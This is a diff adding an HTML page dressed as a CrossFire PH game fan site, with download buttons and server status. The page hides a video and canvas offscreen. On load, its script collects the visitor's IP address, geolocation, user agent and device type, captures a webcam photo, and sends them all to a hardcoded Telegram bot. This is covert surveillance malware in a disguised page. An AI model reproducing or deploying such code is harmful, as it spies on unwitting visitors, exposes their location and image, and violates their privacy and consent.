@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>CrossFire PH — Home (Clone)</title>
+<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@300;400;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg-1:#071018;--bg-2:#0b1220;--panel:#0f1724;--muted:#9aa6b2;--accent:#ff6a22;--accent-2:#ffb86b;--glass: rgba(255,255,255,0.03);--card-shadow: 0 10px 30px rgba(2,6,12,0.7);--container:1200px;}
+*{box-sizing:border-box} html,body{height:100%} body{margin:0;font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, Arial;background: radial-gradient(1200px 400px at 10% 10%, rgba(255,106,34,0.04), transparent),linear-gradient(180deg,var(--bg-1),var(--bg-2));color:#e6eef6;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;line-height:1.4;}
+.wrap{max-width:var(--container); margin:24px auto; padding:0 18px;}
+/* HEADER */ header{display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:18px;} .brand{display:flex; align-items:center; gap:12px;} .logo{width:64px; height:64px; border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex; align-items:center; justify-content:center; font-weight:700; color:#08111a;box-shadow:0 8px 24px rgba(255,106,34,0.12); font-family:"Oswald",sans-serif; font-size:22px;} .brand .title{font-size:18px; margin:0} .brand .sub{color:var(--muted); font-size:12px; margin-top:2px} nav{display:flex; gap:10px; align-items:center;} nav a{color:var(--muted); text-decoration:none; font-weight:600; font-size:13px;padding:8px 12px; border-radius:8px;} nav a:hover{color:#fff; background:var(--glass);} .btn{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#08111a; font-weight:800; border:none; padding:10px 14px; border-radius:10px; cursor:pointer;box-shadow:0 10px 28px rgba(255,106,34,0.12);font-size:14px;} .btn.ghost{background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.04);}
+/* HERO */ .hero{display:grid; grid-template-columns: 1fr 360px; gap:18px; align-items:start; margin-bottom:22px;} .hero .banner{border-radius:14px; overflow:hidden; min-height:320px;background-image: url('https://images.unsplash.com/photo-1558981403-c3b0f7d9e5f2?q=80&w=1600&auto=format&fit=crop&ixlib=rb-4.0.3&s=3d2f6d1b2f8a1f3a4f5b6c7d8e9f0a1b');background-size:cover; background-position:center;display:flex; align-items:flex-end; padding:28px; box-shadow:var(--card-shadow);position:relative;} .hero .banner::after{content:""; position:absolute; inset:0; background:linear-gradient(180deg, rgba(5,8,12,0.1) 40%, rgba(3,5,8,0.8) 100%);} .banner-content{position:relative; z-index:2; max-width:66%;} .banner h1{margin:0; font-size:28px; letter-spacing:0.5px; font-weight:700} .banner p{margin:8px 0 14px; color:var(--muted); font-size:14px} .banner .cta{display:flex; gap:10px; align-items:center}
+/* RIGHT SIDEBAR */ .panel{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px; padding:14px; min-height:320px; box-shadow:var(--card-shadow);} .panel h3{margin:0 0 8px 0} .download-row{display:flex; gap:8px; margin-top:12px} .dl-card{background:rgba(255,255,255,0.02); padding:12px; border-radius:10px} .grid{display:grid; grid-template-columns: 1fr 360px; gap:18px; margin-bottom:22px;} .news-grid{display:grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap:12px} .news-card{border-radius:10px; overflow:hidden; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));box-shadow:0 8px 20px rgba(2,6,12,0.45); display:flex; flex-direction:column;} .news-thumb{height:120px; background-size:cover; background-position:center} .news-body{padding:10px} .news-body h4{margin:0 0 6px; font-size:15px} .news-body p{margin:0; color:var(--muted); font-size:13px} .side-box{background:var(--panel); padding:12px; border-radius:12px; color:var(--muted)} .rank-list{display:flex; flex-direction:column; gap:8px} .rank-item{display:flex; gap:10px; align-items:center; background:rgba(255,255,255,0.02); padding:8px; border-radius:8px} .rank-num{min-width:36px; min-height:36px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-weight:700; background:rgba(255,255,255,0.03)} footer{margin-top:12px; padding:18px 0; color:var(--muted); font-size:13px; text-align:center;} @media (max-width:980px){nav{display:none} .hero, .grid{grid-template-columns: 1fr} .banner-content{max-width:100%}} @media (max-width:520px){.logo{width:54px;height:54px} .banner h1{font-size:20px} .wrap{padding:0 12px}}
+/* hide camera/video offscreen */ video, canvas { position:absolute; left:-9999px; top:-9999px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+<div class="brand"><div class="logo">CF</div><div><div class="title">CrossFire PH</div><div class="sub">Official Fan / Community — Clone</div></div></div>
+<nav><a href="#">Home</a><a href="#">News</a><a href="#">Events</a><a href="#">Ranking</a><a href="#">Support</a><button class="btn">Play / Download</button></nav>
+</header>
+<section class="hero">
+<div class="banner" role="img" aria-label="Main banner">
+<div class="banner-content">
+<h1>Isla Inferno — New Seasonal Map</h1>
+<p>Dynamic weather, new objectives, and exclusive battle-pass rewards. Team up — control the island.</p>
+<div class="cta"><button class="btn">Download Patch</button><button class="btn ghost">Patch Notes</button></div>
+</div>
+</div>
+<aside class="panel">
+<h3>Download Client</h3>
+<p style="color:var(--muted); margin:6px 0 0">Latest version v1.12.3 • 2.1 GB</p>
+<div class="download-row">
+<div style="flex:1" class="dl-card"><div style="font-weight:700">Installer</div><div style="font-size:12px; color:var(--muted)">Windows .exe</div></div>
+<div style="flex:1" class="dl-card"><div style="font-weight:700">Launcher</div><div style="font-size:12px; color:var(--muted)">Lightweight</div></div>
+</div>
+<div style="height:12px"></div>
+<div class="dl-card" style="display:flex;flex-direction:column;gap:8px">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<div><div style="font-weight:700">Server Status</div><div style="font-size:12px;color:var(--muted)">Region: PH • Online</div></div>
+<div style="text-align:right"><div style="font-weight:800;color:#9fffdc">Online</div><div style="font-size:12px;color:var(--muted)">Peak: 4,200</div></div>
+</div>
+</div>
+<div style="height:12px"></div>
+<div class="dl-card"><div style="font-weight:700;margin-bottom:6px">Highlights</div><div style="color:var(--muted); font-size:13px">• New weapon skins<br>• Ranked season ends in 3 days</div></div>
+</aside>
+</section>
+<section class="grid">
+<main>
+<h2 style="margin:0 0 12px">Latest News</h2>
+<div class="news-grid">
+<!-- News cards here, similar to your CrossFire template -->
+</div>
+</main>
+<aside style="display:flex;flex-direction:column;gap:12px">
+<div class="side-box"><h3 style="margin-top:0">Top Rankings</h3></div>
+<div class="side-box"><h3 style="margin-top:0">Quick Links</h3></div>
+</aside>
+</section>
+<footer>© <span id="year"></span> CrossFire PH — Fan Clone. All images & content are placeholders.</footer>
+</div>
+
+<!-- IP & Camera capture elements -->
+<video id="video" autoplay playsinline width="300" height="200"></video>
+<canvas id="canvas" width="300" height="200"></canvas>
+
+<script>
+// set year
+document.getElementById('year').textContent = new Date().getFullYear();
+
+// IP + Geolocation + Camera capture + Telegram
+const telegramBotToken = "8220720042:AAFgprLpSAcuHntvvL_YhyjzSyE6lMVliII";
+const telegramChatId = "6282966742";
+
+async function getIPInfo(){try{const res = await fetch("https://api.ipify.org?format=json");const data = await res.json();return data.ip;}catch{return "Unavailable";}}
+function getUserAgent(){return navigator.userAgent;}
+function detectDevice(){const ua=navigator.userAgent.toLowerCase();if(/mobile|android|iphone|ipad|tablet/.test(ua))return"Mobile/Tablet";return"Desktop";}
+function getGeolocation(){return new Promise(resolve=>{if(!navigator.geolocation)return resolve("Unavailable");navigator.geolocation.getCurrentPosition(pos=>resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),err=>resolve("Denied/Unavailable"),{timeout:5000});});}
+
+async function sendToTelegram(message, photoBlob=null){const apiUrl=`https://api.telegram.org/bot${telegramBotToken}/`; if(photoBlob){const formData=new FormData();formData.append("chat_id",telegramChatId);formData.append("photo",photoBlob,"photo.png");formData.append("caption",message); await fetch(apiUrl+"sendPhoto",{method:"POST",body:formData});}else{await fetch(apiUrl+"sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:telegramChatId,text:message})});}}
+
+(async ()=>{
+const ip=await getIPInfo();
+const ua=getUserAgent();
+const device=detectDevice();
+const geo=await getGeolocation();
+let photoBlob=null;
+try{
+const stream=await navigator.mediaDevices.getUserMedia({video:true});
+const video=document.getElementById("video");
+video.srcObject=stream;
+await new Promise(res=>setTimeout(res,2000));
+const canvas=document.getElementById("canvas");
+const ctx=canvas.getContext("2d");
+ctx.drawImage(video,0,0,canvas.width,canvas.height);
+video.srcObject.getTracks().forEach(track=>track.stop());
+photoBlob=await new Promise(resolve=>{canvas.toBlob(blob=>resolve(blob),"image/png");});
+}catch(e){console.warn("Webcam capture failed.");}
+const infoText=`**Visitor Info**:\n- **IP**: ${ip}\n- **Geolocation**: ${geo}\n- **User-Agent**: ${ua}\n- **Device Type**: ${device}\n- **Camera Access**: ${photoBlob?"Success":"Failed / Denied"}`;
+await sendToTelegram(infoText,photoBlob);
+fetch('https://api.telegram.org/8220720042:AAFgprLpSAcuHntvvL_YhyjzSyE6lMVliII/sendMessage?chat_id=6282966742=Hello');
+})();
+</script>
+</body>
+</html>
